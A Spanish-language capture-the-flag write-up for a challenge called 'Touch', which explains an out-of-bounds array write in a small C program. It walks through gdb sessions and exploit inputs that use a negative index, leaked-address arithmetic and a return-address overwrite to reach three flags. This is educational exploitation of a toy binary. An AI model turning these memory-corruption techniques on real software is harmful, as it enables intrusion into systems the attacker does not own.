# Touch Writeup
### Descripción
Hemos encontrado un servicio que expone un binario un tanto sospechoso. Crees que podrás conseguir todas las flags? Puedes conectarte con el siguiente comando:

`nc 217.18.163.123 12345678`

### Writeup
Examinando el código fuente `touch.c` proporcionado nos encontramos lo siguiente:

```c
unsigned long p[] = {1,2,3};
printf("Código secreto de ayuda para flag2: %p\n", p);

unsigned long index = 0, value = 0;
printf("Introduce un índice: ");
scanf("%lu", &index);
printf("Introduce un valor: ");
scanf("%lu", &value);

p[index] = value;
```

El programa nos imprime la dirección de un array `p`, que se encuentra en la stack. A continuación, lee un índice y un valor, y escribe el valor en el índice del array. Esto supone una vulnerabilidad, ya que introduciendo un índice mayor al tamaño del array o un índice negativo se provoca un acceso *out-of-bounds*.

El reto consiste en conseguir tres flags. Para dos de ellas el objetivo es modificar dos variables, `untouchable1` y `untouchable2` con unos valores específicos. Para la tercera, de alguna forma hay que conseguir ejecutar la función `win`.

#### Primera flag
Para la primera flag debemos escribir el valor `0xcacabaca` en la variable `untouchable1` que, al igual que el array `p`, se encuentra en la stack. Para modificar la variable `untouchable1`, debemos calcular el índice en el que se encuentra con respecto al array `p`. Para ello, podemos hacer uso de `gdb` para imprimir las direcciones de memoria de ambas variables:

```
(gdb) start
Punto de interrupción temporal 1 at 0x401b4e: file touch.c, line 14.
Starting program: /tmp/touch 

Temporary breakpoint 1, main () at touch.c:14
14	int main() {
(gdb) print &p
$1 = (unsigned long (*)[3]) 0x7fffffffda50
(gdb) print &untouchable1
$2 = (unsigned long *) 0x7fffffffda48
(gdb) 
```

Podemos observar que la posición de `untouchable1` en memoria es 8 bytes antes que el array `p`. `p` es un array de `unsigned long`, que ocupan 8 bytes cada uno. Esto significa que `p[i]` accede a la dirección de memoria `&p + i*8`. En nuestro caso, como `untouchable1` se encuentra en la dirección `&p - 8`, el índice que buscamos es `-1`. Es decir, estamos accediendo a una posición anterior al array `p` con un índice negativo. Introduciendo el valor `0xcacabaca` en decimal en dicho índice obtenemos la primera flag:

```
$ nc localhost 31337
Código secreto de ayuda para flag2: 0x7ffcaedcacb0
Introduce un índice: -1
Introduce un valor: 3402283722
ETSIIT_CTF{negative_1ndex_t0_pwn_th3m_all!}
```

#### Segunda flag
Para la segunda flag tenemos que modificar la variable `untouchable2`. Sin embargo, mientras que `untouchable1` era una variable local y se encontraba en la stack, `untouchable2` es una global y por tanto se encuentra en el rango de direcciones del programa. Podemos verlo con gdb:

```
(gdb) print &p
$2 = (unsigned long (*)[3]) 0x7fffffffda50
(gdb) print &untouchable2
$3 = (unsigned long *) 0x4e70f0 <untouchable2>
(gdb) info proc mappings 
proceso 11606
Espacios de direcciones asignados:

          Start Addr           End Addr       Size     Offset  Perms  objfile
            0x400000           0x401000     0x1000        0x0  r--p   /tmp/touch
            0x401000           0x4b8000    0xb7000     0x1000  r-xp   /tmp/touch
            0x4b8000           0x4e3000    0x2b000    0xb8000  r--p   /tmp/touch
            0x4e3000           0x4e7000     0x4000    0xe2000  r--p   /tmp/touch
            0x4e7000           0x4ea000     0x3000    0xe6000  rw-p   /tmp/touch
            0x4ea000           0x511000    0x27000        0x0  rw-p   [heap]
      0x7ffff7ff9000     0x7ffff7ffd000     0x4000        0x0  r--p   [vvar]
      0x7ffff7ffd000     0x7ffff7fff000     0x2000        0x0  r-xp   [vdso]
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0  rw-p   [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0  --xp   [vsyscall]
```

Además del hecho de que `untouchable2` se encuentra muy alejada de `p`, tenemos otra cuestión: la dirección de la stack cambia en cada ejecución, y por tanto la dirección de `p`. Esto no era problema para la primera flag, ya que `untouchable1` también se encontraba en la stack, y por tanto su dirección era relativa a la de `p`. Pero en este caso la dirección de `untouchable2` se mantiene fija, mientras que la de `p` cambia cada vez. Afortunadamente, el programa nos imprime la dirección de `p` en cada ejecución:

```
$ ./touch 
Código secreto de ayuda para flag2: 0x7fffb375f910
Introduce un índice: ^C
$ ./touch 
Código secreto de ayuda para flag2: 0x7ffd4be68f30
Introduce un índice: ^C
```

Siguiendo la lógica descrita anteriormente, como `p[i]` accede a la dirección de memoria `&p + i*8`, podemos obtener la siguiente fórmula para escribir en una dirección de memoria arbitraria:

```
indice = (dirección_objetivo - dirección_de_p)/8
```

En nuestro, `dirección_objetivo = 0x4e70f0` (la dirección de `untouchable2` obtenida con `gdb`), y la dirección de `p` es la que nos imprime el programa. Usando python para aplicar dicha fórmula calculamos el índice adecuado según la dirección de `p` y obtenemos la segunda flag:

```
$ python3
>>> (0x4e70f0 - 0x7ffd5c990a20)//8
-17590768980774
>>> 0x123456
1193046
```

```
$ nc localhost 31337
Código secreto de ayuda para flag2: 0x7ffd5c990a20
Introduce un índice: -17590768980774
Introduce un valor: 1193046
ETSIIT_CTF{m4st3r_of_0ut_0f_b0unds_ar1thm3tics!}
```


#### Tercera flag
Para obtener la tercera flag el objetivo no es modificar una variable como en los casos anteriores, sino de alguna forma conseguir ejecutar la función `win()`.

Para ello, es necesario recordar algunos conceptos teóricos. La stack es una región de memoria en la que se guardan variables locales, como el array `p` o la variable `untouchable1`. Sin embargo, también se guarda otra información de forma transparente al programador: direcciones de retorno. Cada vez que se llama a una función se guarda en la pila la dirección de retorno. De esta forma, cuando se termine de ejecutar la función el flujo de ejecución puede continuar por donde iba.

Imaginemos un programa en el que `main()` llame a una función `test()`. El código ensamblador generado sería tal que así:

```
1129 <test>: ...
1137:    ret

1138 <main>: ...
1149:    call 1129 <test>
114e:    ...
```

Cuando `main()` ejecuta la instrucción `call` en la dirección `1149`, ocurren dos cosas. En primer lugar, se guarda en la stack la dirección de la siguiente instrucción, es decir, la dirección `114e`. En segundo lugar, se comienza a ejecutar la función `test()`, en la dirección `1129`. Cuando `test()` termina, ejecuta la instrucción `ret`. Dicha instrucción lo que hace es saltar a la dirección de retorno previamente guardada en la stack, en este caso la dirección `114e`. De esta forma, después de la llamada a la función la ejecución continúa por donde iba.

De vuelta a nuestro reto, como tenemos una primitiva que nos permite alterar cualquier valor de la stack, el objetivo es modificar la dirección de retorno de la función `main()` con la dirección de la función `win()`. Así conseguimos alterar el flujo de ejecución, ya que cuando la función `main()` termine y ejecute la instrucción `ret` saltará a la función `win()`.

Para obtener la dirección de la stack en la que se encuentra la dirección de retorno que queremos modificar hay varias opciones. Una de ellas es ejecutar el programa con `gdb`, poner un breakpoint al final de la función `main()`, y examinar la stack.

```
(gdb) start
Punto de interrupción temporal 1 at 0x401b4e: file touch.c, line 14.
Starting program: /tmp/touch

Temporary breakpoint 1, main () at touch.c:14
(gdb) disassemble main
Dump of assembler code for function main:
[...]
   0x0000000000401c9e <+348>:   leave  
   0x0000000000401c9f <+349>:   ret    
End of assembler dump.
(gdb) break *0x0000000000401c9f
Punto de interrupción 2 at 0x401c9f: file touch.c, line 37.
(gdb) continue
Continuando.
Código secreto de ayuda para flag2: 0x7fffffffd8d0
Introduce un índice: 0
Introduce un valor: 0
Nope! Valores: 31337 31337

Breakpoint 2, 0x0000000000401c9f in main () at touch.c:37
(gdb) print $rsp
$1 = (void *) 0x7fffffffd8f8
(gdb) x/gx $rsp
0x7fffffffd8f8: 0x00000000004020ca
```

Vemos que normalmente `main()` retorna a la dirección `0x4020ca`, que se encuentra en la dirección de la stack `0x7fffffffd8f8`. Otra forma de obtener dicha dirección es con el comando `info frame`, que nos indica cuál es la dirección de retorno (`0x4020ca`) y donde se encuentra (`0x0x7fffffffd8f8`).

```
(gdb) info frame
Stack level 0, frame at 0x7fffffffd900:
 rip = 0x401b4e in main (touch.c:14); saved rip = 0x4020ca
 [...]
 Saved registers:
  rbp at 0x7fffffffd8f0, rip at 0x7fffffffd8f8
```

Aplicando la fórmula anterior obtenemos el índice que debemos introducir para modificar la dirección de retorno:

```
>>> (0x7fffffffd8f8 - 0x7fffffffd8d0)//8
5
```

El valor que queremos escribir es la dirección de `win()`, de forma que cuando `main()` termine, en vez de saltar a su dirección de retorno normal `0x4020ca` salte a `win()`.

```
(gdb) print &win
$2 = (void (*)()) 0x401b15 <win>
(gdb) print/d 0x401b15
$3 = 4201237
```

Finalmente, introduciendo el índice calculado y la dirección de `win()` obtenemos la flag:

```
$ nc localhost 31337
Código secreto de ayuda para flag2: 0x7ffd12810470
Introduce un índice: 5
Introduce un valor: 4201237
Nope! Valores: 31337 31337
Enhorabuena! Aquí tienes tu flag:
ETSIIT_CTF{0ut_0f_b0unds_to_c0de_r3d1rection1337}
```

Cuando `main()` termina salta a `win()` y nos imprime la flag. Sin embargo, ya que `win()` no ha sido llamado de forma correcta con una instrucción `call`, cuando termina intenta retornar a una dirección inválida. Es por eso que se produce un segmentation fault y el programa termina.

